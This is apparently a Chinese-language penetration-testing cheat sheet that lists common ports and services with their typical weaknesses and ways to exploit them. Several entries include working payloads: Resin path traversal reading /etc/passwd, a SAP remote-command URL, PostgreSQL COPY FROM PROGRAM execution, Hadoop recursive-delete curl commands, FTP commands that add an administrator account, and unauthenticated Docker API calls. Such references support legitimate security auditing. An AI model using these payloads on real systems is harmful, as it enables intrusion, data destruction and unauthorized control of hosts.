# 常见端口利用



面对一个目标主机时，我们往往通过端口扫描来了解目标主机开放的端口和服务。当看到一个端口号时，你是否已经猜到它是什么服务，以及它可能存在哪些安全漏洞和利用姿势呢？

今天分享一些常见的端口服务及漏洞利用，帮助你快速找到获取主机权限的攻击路径。

### **1、远程管理端口**

**22 端口（SSH）**

```
安全攻击：弱口令、暴力猜解、用户名枚举
利用方式：
1、通过用户名枚举可以判断某个用户名是否存在于目标主机中，
2、利用弱口令/暴力破解，获取目标主机权限。
```

**23 端口（Telnet）**

```
安全漏洞：弱口令、明文传输
利用方式：
1、通过弱口令或暴力破解，获取目标主机权限。
2、嗅探抓取telnet明文账户密码。
```

**3389 端口（RDP）**

```
安全漏洞：暴力破解
利用方式：通过弱口令或暴力破解，获取目标主机权限。
```

**5632 端口（Pcanywhere）**

```
安全漏洞：弱口令、暴力破解
利用方式：通过弱口令或暴力破解，获取目标主机权限
```

**5900 端口（VNC）**

```
安全漏洞：弱口令、暴力破解
利用方式：通过弱口令或暴力破解，获取目标主机权限。
```

### **2、Web中间件/服务端口**

**1090/1099 端口（RMI）**

```
安全漏洞：JAVA RMI 反序列化远程命令执行漏洞
利用方式：使用nmap检测端口信息。
端口信息：1099/1090    Java-rmi    Java RMI Registry
检测工具：attackRMI.jar
```

**7001 端口（Weblogic）**

```
安全漏洞：弱口令、SSRF、反序列化漏洞
利用方式：
1、控制台弱口令上传war木马
2、SSRF内网探测
3、反序列化远程代码执行等
```

**8000 端口（jdwp）**

```
安全漏洞：JDWP 远程命令执行漏洞
端口信息：
    8000             jdwp           java Debug Wire Protocol
检测工具：https://github.com/IOActive/jdwp-shellifier
```

**8080 端口（Tomcat）**

```
安全漏洞：弱口令、示例目录
利用方式：通过弱口令登录控制台，上传war包。
```

**8080 端口（Jboss）**

```
安全漏洞：未授权访问、反序列化。
利用方式：
1、未授权访问控制台，远程部署木马
2、反序列化导致远程命令执行等。
检测工具：https://github.com/joaomatosf/jexboss
```

**8080 端口（Resin）**

```
安全漏洞：目录遍历、远程文件读取
利用方式：通过目录遍历/远程文件读取获取敏感信息，为进一步攻击提供必要的信息。
任意文件读取POC：
  payload1 = "/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd"
  payload2 = "/resin-doc/examples/jndi-appconfig/test?inputFile=../../../../../../../../../../etc/passwd"
  payload3 = "/ ..\\\\web-inf"
```

**8080 端口（Jetty）**

```
安全漏洞：远程共享缓冲区泄漏
利用方式：攻击者可以通过精心构造headers值来触发异常并偏移到共享缓冲区，其中包含了之前其他用户提交的请求，服务器会根据攻击者的payload返回特定位置的数据。
检测工具：https://github.com/GDSSecurity/Jetleak-Testing-Script
```

**8080 端口（GlassFish）**

```
安全漏洞：弱口令、任意文件读
取利用方式：
1、弱口令admin/admin，直接部署shell
2、任意文件读取获取服务器敏感配置信息
```

**8080 端口（Jenkins）**

```
安全漏洞：未授权访问 、远程代码执行
利用方式：访问如下url，可以执行脚本命令，反弹shell，写入webshell等。http://<target>:8080/managehttp://<target>:8080/script
```

**8161 端口（ActiveMQ）**

```
安全漏洞：弱口令、任意文件写入、反序列化
利用方式：默认密码admin/admin登陆控制台、写入webshell、上传ssh key等方式。
```

_**\\**_**9043 端口（webSphere）\*\***

```
安全漏洞：控制台弱口令、远程代码执行
后台地址：https://:9043/ibm/console/logon.jsp
```

**\*\\**\*\*\*50000 端口 （SAP）\*\*\*\*\*_\*_

```
安全漏洞：远程代码执行利用方式：攻击者通过构造url请求，实现远程代码执行。POC:http://<target>:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=cmd.exe /c ipconfig /all
```

**50070 端口（hadoop）**

```
安全漏洞：未授权访问
利用方式：攻击者可以通过命令行操作多个目录下的数据，如进行删除操作。curl -i -X DELETE “http://ip:50070/webhdfs/v1/tmp?op=DELETE&recursive=true“curl -i -X PUT “http://ip:50070/webhdfs/v1/NODATA4U_SECUREYOURSHIT?op=MKDIRS“
```

### **3、数据库端口**

**389 端口（ldap）**

```
安全漏洞：未授权访问 、弱口令
利用方式：通过LdapBrowser工具直接连入。
```

**1433 端口（Mssql）**

```
安全漏洞：弱口令、暴力破解
利用方式：差异备份getshell、SA账户提权等
```

**1521 端口（Oracle）**

```
安全漏洞：弱口令、暴力破解
利用方式：通过弱口令/暴力破解进行入侵。
```

**3306 端口（MySQL）**

```
安全漏洞：弱口令、暴力破解
利用方式：利用日志写入webshell、udf提权、mof提权等。
```

**5432 端口（ PostgreSQL）**

```
安全漏洞：弱口令、高权限命令执行
利用方式：攻击者通过弱口令获取账号信息，连入postgres中，可执行系统命令。
PoC参考：    
DROP TABLE IF EXISTS cmd_exec;    
CREATE TABLE cmd_exec(cmd_output text);    
COPY cmd_exec FROM PROGRAM 'id';    
SELECT * FROM cmd_exec;
```

**5984 端口（CouchDB）**

```
安全漏洞：垂直权限绕过、任意命令执行
利用方式：通过构造数据创建管理员用户，使用管理员用户登录，构造恶意请求触发任意命令执行。
后台访问：http://<target>:5984/_utils
```

**6379 端口（Redis）**

```
安全漏洞：未授权访问
利用方式：绝对路径写webshell 、利用计划任务执行命令反弹shell、公私钥认证获取root权限、主从复制RCE等。
```

**9200 端口（elasticsearch）**

```
安全漏洞：未授权访问、命令执行
检测方式：
1、直接访问如下url，获取相关敏感信息。  
http://<target>:9200/_nodes
查看节点数据  http://<target>:9200/_river  查看数据库敏感信息
2、通过构造特定的数据包，执行任意命令。
```

**11211 端口（MemCache）**

```
安全漏洞：未授权访问
检测方式：无需用户名密码，可以直接连接memcache 服务的11211端口。
nc -vv <target> 11211
```

**27017 端口（Mongodb）**

```
安全漏洞：未授权访问、弱口令
利用方式：未授权访问/弱口令，远程连入数据库，导致敏感信息泄露。
```

### **4、常见协议端口**

**21 端口（FTP)**

```
安全漏洞：
1、配置不当    
2、明文传输    
3、第三方软件提权
利用方式：
1、匿名登录或弱口令
2、嗅探ftp用户名和密码
3、Serv-U权限较大的账号可导致系统命令执行。
FTP提权命令：  
# 增加系统用户   
Quote site exec net user 4567 4567 /add  
# 提升到管理员权限   
Quote site exec net localgroup administrators 4567 /add
```

**25 端口（SMTP）**

```
攻击方式：
1、匿名发送邮件 
2、弱口令 
3、SMTP用户枚举
利用方式：
1、SMTP服务器配置不当，攻击者可以使用任意用户发送邮件。
2、SMTP弱口令扫描，获取用户账号密码，发送邮件钓鱼。
3、通过SMTP用户枚举获取用户名：   
nmap -p 25 -- smtp-enum-users.nse <target>
```

**53 端口（DNS）**

```
安全攻击：
1、DNS域传送漏洞、DNS欺骗、DNS缓存投毒
检测方式：
1、DNS域传送漏洞，Windows下检测使用nslookup命令，Linux下检测使用dig命令，通过执行命令可以清楚的看到域名解析情况。
2、DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。
3、DNS缓存投毒是攻击者欺骗DNS服务器相信伪造的DNS响应的真实性。
```

**161 端口（SNMP）**

```
安全漏洞：默认团体名/弱口令访问
利用方式：通过nmap自带的审计脚本进行检测，可能导致敏感信息泄露。。
1、弱口令检测：nmap –sU –p161 –script=snmp-brute <target>
2、获取系统信息：nmap –sU –p161 –script=snmp-sysdescr <target>
3、获取用户信息：nmap -sU -p161 --script=snmp-win32-user <target>
4、获取网络端口状态：nmap -sU -p161 --script=snmp-netstat <target>
```

**443 端口（SSL）**

```
安全漏洞：OpenSSL 心脏出血
利用方式：攻击者可以远程读取存在漏洞版本的openssl服务器内存中长大64K的数据。
扫描脚本：nmap -sV --script=ssl-heartbleed <target>
```

**445 端口（SMB）**

```
安全漏洞：信息泄露、远程代码执行
利用方式：可利用共享获取敏感信息、缓冲区溢出导致远程代码执行，如ms17010。
```

**873 端口（Rsync）**

```
安全漏洞：匿名访问、弱口令
利用方式：攻击者可以执行下载/上传等操作，也可以尝试上传webshell。
1、下载：#rsync -avz a.b.c.d::path/file path/filiname  
2、上传：#rsync -avz path/filename a.b.c.d::path/file
```

**2181 端口（Zookeeper）**

```
安全漏洞：未授权访问
检测方式：攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。 echo envi | nc ip port
```

**2375 端口（Docker）**

```
安全漏洞：未授权方式
检测方式：通过docker daemon api 执行docker命令。#列出容器信息，效果与docker ps -a 一致。 
curl http://<target>:2375/containers/json 
docker -H tcp://<target>:2375 start <Container Id>
```
